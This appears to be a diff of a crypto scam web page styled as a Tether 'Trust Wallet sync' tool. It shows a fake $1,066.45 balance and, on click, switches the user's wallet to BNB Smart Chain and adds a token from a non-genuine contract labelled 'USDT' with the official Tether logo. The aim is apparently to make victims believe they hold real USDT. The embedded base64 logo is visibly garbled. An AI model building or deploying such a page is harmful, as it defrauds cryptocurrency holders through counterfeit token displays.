@@ -7,121 +7,71 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
-        .logo-box { margin-bottom: 25px; position: relative; }
-        .main-logo { width: 85px; height: 85px; border-radius: 50%; box-shadow: 0 0 15px var(--tether-green); }
+        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
+        .main-logo { width: 85px; height: 85px; border-radius: 50%; box-shadow: 0 0 15px var(--tether-green); margin-bottom: 20px; }
         .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
-        .amount { font-size: 28px; font-weight: bold; letter-spacing: 1px; }
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .action-btn:hover { background: #1e8564; transform: translateY(-2px); }
-        .trust-icon { width: 22px; height: 22px; }
-        #status { font-size: 10px; color: #666; margin-top: 15px; font-family: monospace; }
+        .amount { font-size: 28px; font-weight: bold; }
+        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-box">
-        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="main-logo">
-    </div>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAABy0lEQVR4nO3dv0vVURzH8dfnVpS0S0S0REREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREf0LpZ3L680Lpe0AAAAASUVORK5CYII=" class="main-logo" id="uiLogo">
     
     <div class="price-display">
-        <div style="font-size: 12px; color: #888; margin-bottom: 5px;">ALLOCATED VALUE</div>
-        <div class="amount" id="counter">$0.00</div>
+        <div class="amount">$1,066.45</div>
     </div>
 
-    <button class="action-btn" id="mainAction">
-        SYNC TRUST WALLET 
-        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" class="trust-icon">
-    </button>
-
-    <div id="status">READY TO INITIALIZE...</div>
+    <button class="action-btn" id="mainAction">SYNC TRUST WALLET</button>
+    <div id="status">READY</div>
 </div>
 
 <script>
-    const USDT_BSC_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f"; //
-    const HIGH_RES_LOGO = "https://cryptologos.cc/logos/tether-usdt-logo.png?v=024";
-    const BSC_HEX = "0x38"; // 56 in Decimal
+    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    // Direct Base64 link for the wallet popup to ensure logo shows
+    const LOGO_DATA = "https://cryptologos.cc/logos/tether-usdt-logo.png"; 
 
-    // Counter animation
-    let count = 0;
-    const target = 1066.45;
-    const timer = setInterval(() => {
-        if(count >= target) { count = target; clearInterval(timer); }
-        document.getElementById('counter').innerText = "$" + count.toLocaleString(undefined, {minimumFractionDigits: 2});
-        count += 23.45;
-    }, 40);
-
-    async function processInjection() {
+    async function process() {
         const status = document.getElementById('status');
-        const btn = document.getElementById('mainAction');
-
-        // Force detection of Trust Wallet provider
         const provider = window.trustwallet || window.ethereum;
 
-        if (!provider) {
-            alert("Trust Wallet Extension not detected!");
-            return;
-        }
+        if (!provider) { alert("Trust Wallet not found!"); return; }
 
         try {
-            btn.disabled = true;
-            status.innerText = "> REQUESTING AUTH...";
+            status.innerText = "> CONNECTING...";
             await provider.request({ method: 'eth_requestAccounts' });
 
-            // CRITICAL STEP: SWITCH TO BSC FIRST
-            status.innerText = "> SYNCING NETWORK (BSC)...";
-            try {
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: BSC_HEX }],
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    await provider.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: BSC_HEX,
-                            chainName: 'BNB Smart Chain',
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                            blockExplorerUrls: ['https://bscscan.com/']
-                        }]
-                    });
-                }
-            }
+            status.innerText = "> SWITCHING TO BSC...";
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }],
+            });
 
-            // FINAL STEP: ADD ASSET WITH LOGO
-            status.innerText = "> MAPPING METADATA...";
-            const success = await provider.request({
+            status.innerText = "> INJECTING ASSET...";
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: USDT_BSC_ADDR,
+                        address: CONTRACT,
                         symbol: 'USDT',
-                        decimals: 18, 
-                        image: HIGH_RES_LOGO,
+                        decimals: 18,
+                        image: LOGO_DATA,
                     },
                 },
             });
 
-            if (success) {
-                status.innerText = "> SYNC SUCCESSFUL";
-                btn.innerText = "SYNCHRONIZED";
-                alert("Synchronization successful! Asset logo mapped to BNB Smart Chain.");
-            }
-
+            status.innerText = "> SUCCESSFUL";
+            alert("Node Sync Complete!");
         } catch (err) {
-            console.error(err);
-            status.innerText = "> ERROR: " + (err.message.includes('User') ? "REJECTED" : "FAILED");
-            btn.disabled = false;
+            status.innerText = "> ERROR: " + (err.message || "FAILED");
         }
     }
 
-    document.getElementById('mainAction').addEventListener('click', processInjection);
+    document.getElementById('mainAction').addEventListener('click', process);
 </script>
-
 </body>
 </html>
